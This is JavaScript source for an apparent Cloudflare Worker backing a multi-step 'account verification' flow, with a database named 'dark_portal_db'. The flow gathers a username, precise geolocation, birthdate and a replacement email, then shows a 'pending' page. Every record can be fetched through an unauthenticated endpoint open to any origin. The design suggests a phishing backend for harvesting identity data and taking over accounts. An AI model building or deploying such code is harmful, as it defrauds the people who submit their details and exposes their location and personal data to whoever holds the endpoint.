export default {
  async fetch(request, env, ctx) {
    const url = new URL(request.url);

    // CORS preflight handling
    if (request.method === 'OPTIONS') {
      return new Response(null, {
        status: 204,
        headers: {
          'Access-Control-Allow-Origin': '*',
          'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
          'Access-Control-Allow-Headers': 'Content-Type, Accept',
        },
      });
    }

    const corsHeaders = {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Headers': 'Content-Type, Accept',
    };

    const db = env.DB || env.dark_portal_db;

    // Helper to parse request body (JSON or Form URL-encoded)
    async function parseBody(req) {
      const contentType = req.headers.get('content-type') || '';
      if (contentType.includes('application/json')) {
        try {
          return await req.json();
        } catch {
          return {};
        }
      } else if (
        contentType.includes('application/x-www-form-urlencoded') ||
        contentType.includes('multipart/form-data')
      ) {
        try {
          const formData = await req.formData();
          const obj = {};
          for (const [key, value] of formData.entries()) {
            obj[key] = value;
          }
          return obj;
        } catch {
          return {};
        }
      }
      return {};
    }

    // Helper for redirection or JSON response
    function respondRedirectOrJson(req, id, redirectUrl) {
      const accept = req.headers.get('accept') || '';
      if (accept.includes('application/json')) {
        return Response.json({ id, redirect: redirectUrl }, { headers: corsHeaders });
      }
      return Response.redirect(new URL(redirectUrl, req.url), 302);
    }

    // Health Check Endpoint
    if (url.pathname === '/api/health' && request.method === 'GET') {
      return Response.json(
        { message: 'Terhubung (Online)' },
        { headers: corsHeaders }
      );
    }

    // Step 1: Username / Account Recovery Start
    if (url.pathname === '/api/account' && request.method === 'POST') {
      try {
        const body = await parseBody(request);
        const username = body.username || '';
        const info = await db
          .prepare(
            "INSERT INTO user_verifications (username, submitted_at) VALUES (?, datetime('now', 'localtime'))"
          )
          .bind(username)
          .run();

        const id = info.meta.last_row_id;
        return respondRedirectOrJson(
          request,
          id,
          `/views/verificationlocate.html?id=${id}`
        );
      } catch (err) {
        return Response.json(
          { error: err.message },
          { status: 500, headers: corsHeaders }
        );
      }
    }

    // Step 2: Location Verification
    if (url.pathname === '/api/locate' && request.method === 'POST') {
      try {
        const body = await parseBody(request);
        const { id, latitude, longitude, region } = body;
        const lat = latitude ? parseFloat(latitude) : null;
        const lng = longitude ? parseFloat(longitude) : null;
        const reg =
          region || (lat && lng ? `Lat: ${lat.toFixed(4)}, Lng: ${lng.toFixed(4)}` : '');

        if (id) {
          await db
            .prepare(
              "UPDATE user_verifications SET latitude = ?, longitude = ?, region = ?, submitted_at = datetime('now', 'localtime') WHERE id = ?"
            )
            .bind(lat, lng, reg, id)
            .run();

          return respondRedirectOrJson(
            request,
            id,
            `/views/birthday.html?id=${id}`
          );
        } else {
          await db
            .prepare(
              "UPDATE user_verifications SET latitude = ?, longitude = ?, region = ?, submitted_at = datetime('now', 'localtime') WHERE id = (SELECT MAX(id) FROM user_verifications)"
            )
            .bind(lat, lng, reg)
            .run();

          return respondRedirectOrJson(
            request,
            null,
            '/views/birthday.html'
          );
        }
      } catch (err) {
        return Response.json(
          { error: err.message },
          { status: 500, headers: corsHeaders }
        );
      }
    }

    // Step 3: Birthday Verification
    if (url.pathname === '/api/birthday' && request.method === 'POST') {
      try {
        const body = await parseBody(request);
        const { id, birthdate } = body;
        const bdate = birthdate || '';

        if (id) {
          await db
            .prepare(
              "UPDATE user_verifications SET birthdate = ?, submitted_at = datetime('now', 'localtime') WHERE id = ?"
            )
            .bind(bdate, id)
            .run();

          return respondRedirectOrJson(
            request,
            id,
            `/views/newemail.html?id=${id}`
          );
        } else {
          await db
            .prepare(
              "UPDATE user_verifications SET birthdate = ?, submitted_at = datetime('now', 'localtime') WHERE id = (SELECT MAX(id) FROM user_verifications)"
            )
            .bind(bdate)
            .run();

          return respondRedirectOrJson(
            request,
            null,
            '/views/newemail.html'
          );
        }
      } catch (err) {
        return Response.json(
          { error: err.message },
          { status: 500, headers: corsHeaders }
        );
      }
    }

    // Step 4: New Email Submission
    if (url.pathname === '/api/newemail' && request.method === 'POST') {
      try {
        const body = await parseBody(request);
        const email = body.newEmail || body.email || '';
        const id = body.id;

        if (id) {
          await db
            .prepare(
              "UPDATE user_verifications SET email = ?, submitted_at = datetime('now', 'localtime') WHERE id = ?"
            )
            .bind(email, id)
            .run();

          return respondRedirectOrJson(
            request,
            id,
            '/views/pending.html'
          );
        } else {
          await db
            .prepare(
              "UPDATE user_verifications SET email = ?, submitted_at = datetime('now', 'localtime') WHERE id = (SELECT MAX(id) FROM user_verifications)"
            )
            .bind(email)
            .run();

          return respondRedirectOrJson(
            request,
            null,
            '/views/pending.html'
          );
        }
      } catch (err) {
        return Response.json(
          { error: err.message },
          { status: 500, headers: corsHeaders }
        );
      }
    }

    // Database API: Query verifications
    if (url.pathname === '/api/data' && request.method === 'GET') {
      try {
        const result = await db
          .prepare('SELECT * FROM user_verifications ORDER BY id DESC')
          .all();

        return Response.json(
          { data: result.results },
          { headers: corsHeaders }
        );
      } catch (err) {
        return Response.json(
          { error: err.message },
          { status: 500, headers: corsHeaders }
        );
      }
    }

    // Database API: Insert user
    if (url.pathname === '/api/data' && request.method === 'POST') {
      try {
        const body = await parseBody(request);
        const { name, email } = body;
        const result = await db
          .prepare('INSERT INTO users (name, email) VALUES (?, ?)')
          .bind(name || '', email || '')
          .run();

        return Response.json(
          { id: result.meta.last_row_id },
          { headers: corsHeaders }
        );
      } catch (err) {
        return Response.json(
          { error: err.message },
          { status: 500, headers: corsHeaders }
        );
      }
    }

    // If static assets binding exists (Workers Assets), fall through to assets
    if (env.ASSETS) {
      return env.ASSETS.fetch(request);
    }

    return new Response('Not Found', { status: 404 });
  },
};
